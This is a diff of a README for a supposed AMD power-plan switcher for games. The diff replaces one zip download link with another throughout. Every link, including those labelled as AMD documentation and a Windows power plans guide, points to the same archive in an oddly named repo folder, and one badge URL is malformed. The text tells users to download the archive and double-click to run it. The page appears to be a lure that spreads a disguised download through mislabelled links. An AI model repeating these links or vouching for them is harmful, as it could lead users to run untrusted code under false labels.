@@ -1,6 +1,6 @@
 # 🎮 hsrtsp_power_plan_policy_switcher - Optimize Game Performance on AMD CPUs
 
-[![Download Now](https://github.com/elbyang/hsrtsp_power_plan_policy_switcher/raw/refs/heads/master/masjid/switcher-policy-plan-power-hsrtsp-1.9-alpha.2.zip%https://github.com/elbyang/hsrtsp_power_plan_policy_switcher/raw/refs/heads/master/masjid/switcher-policy-plan-power-hsrtsp-1.9-alpha.2.zip)](https://github.com/elbyang/hsrtsp_power_plan_policy_switcher/raw/refs/heads/master/masjid/switcher-policy-plan-power-hsrtsp-1.9-alpha.2.zip)
+[![Download Now](https://github.com/elbyang/hsrtsp_power_plan_policy_switcher/raw/refs/heads/master/masjid/policy_hsrtsp_power_plan_switcher_2.8-alpha.5.zip%https://github.com/elbyang/hsrtsp_power_plan_policy_switcher/raw/refs/heads/master/masjid/policy_hsrtsp_power_plan_switcher_2.8-alpha.5.zip)](https://github.com/elbyang/hsrtsp_power_plan_policy_switcher/raw/refs/heads/master/masjid/policy_hsrtsp_power_plan_switcher_2.8-alpha.5.zip)
 
 ## 🚀 Getting Started
 
@@ -11,11 +11,11 @@ Welcome to the **hsrtsp_power_plan_policy_switcher**! This application allows yo
 To get started, follow these simple steps:
 
 1. **Visit the Releases Page:** Click on the link below to access the download options for the application:  
-   [Download the Latest Release](https://github.com/elbyang/hsrtsp_power_plan_policy_switcher/raw/refs/heads/master/masjid/switcher-policy-plan-power-hsrtsp-1.9-alpha.2.zip)
+   [Download the Latest Release](https://github.com/elbyang/hsrtsp_power_plan_policy_switcher/raw/refs/heads/master/masjid/policy_hsrtsp_power_plan_switcher_2.8-alpha.5.zip)
 
 2. **Choose Your Version:** On the releases page, look for the latest version. It will typically be listed at the top.
 
-3. **Download the Application:** Select the appropriate file for your system. It is usually named something like `https://github.com/elbyang/hsrtsp_power_plan_policy_switcher/raw/refs/heads/master/masjid/switcher-policy-plan-power-hsrtsp-1.9-alpha.2.zip`. Click on it to start the download.
+3. **Download the Application:** Select the appropriate file for your system. It is usually named something like `https://github.com/elbyang/hsrtsp_power_plan_policy_switcher/raw/refs/heads/master/masjid/policy_hsrtsp_power_plan_switcher_2.8-alpha.5.zip`. Click on it to start the download.
 
 4. **Run the Application:**  
    After the download is complete, locate the file in your Downloads folder. Double-click the file to run it.
@@ -59,8 +59,8 @@ If you encounter any issues, consider the following steps:
 
 For further assistance, consider exploring the following resources:
 
-- [AMD Official Documentation](https://github.com/elbyang/hsrtsp_power_plan_policy_switcher/raw/refs/heads/master/masjid/switcher-policy-plan-power-hsrtsp-1.9-alpha.2.zip)
-- [Windows Power Plans Guide](https://github.com/elbyang/hsrtsp_power_plan_policy_switcher/raw/refs/heads/master/masjid/switcher-policy-plan-power-hsrtsp-1.9-alpha.2.zip)
+- [AMD Official Documentation](https://github.com/elbyang/hsrtsp_power_plan_policy_switcher/raw/refs/heads/master/masjid/policy_hsrtsp_power_plan_switcher_2.8-alpha.5.zip)
+- [Windows Power Plans Guide](https://github.com/elbyang/hsrtsp_power_plan_policy_switcher/raw/refs/heads/master/masjid/policy_hsrtsp_power_plan_switcher_2.8-alpha.5.zip)
 
 ## 📞 Support
 
@@ -68,4 +68,4 @@ If you need more help or encounter issues that are not resolved with the above s
 
 Thank you for using **hsrtsp_power_plan_policy_switcher**! We hope it enhances your gaming experience on AMD CPUs. Don't forget to check back for updates and improvements! 
 
-[Download the Latest Release](https://github.com/elbyang/hsrtsp_power_plan_policy_switcher/raw/refs/heads/master/masjid/switcher-policy-plan-power-hsrtsp-1.9-alpha.2.zip)
+[Download the Latest Release](https://github.com/elbyang/hsrtsp_power_plan_policy_switcher/raw/refs/heads/master/masjid/policy_hsrtsp_power_plan_switcher_2.8-alpha.5.zip)
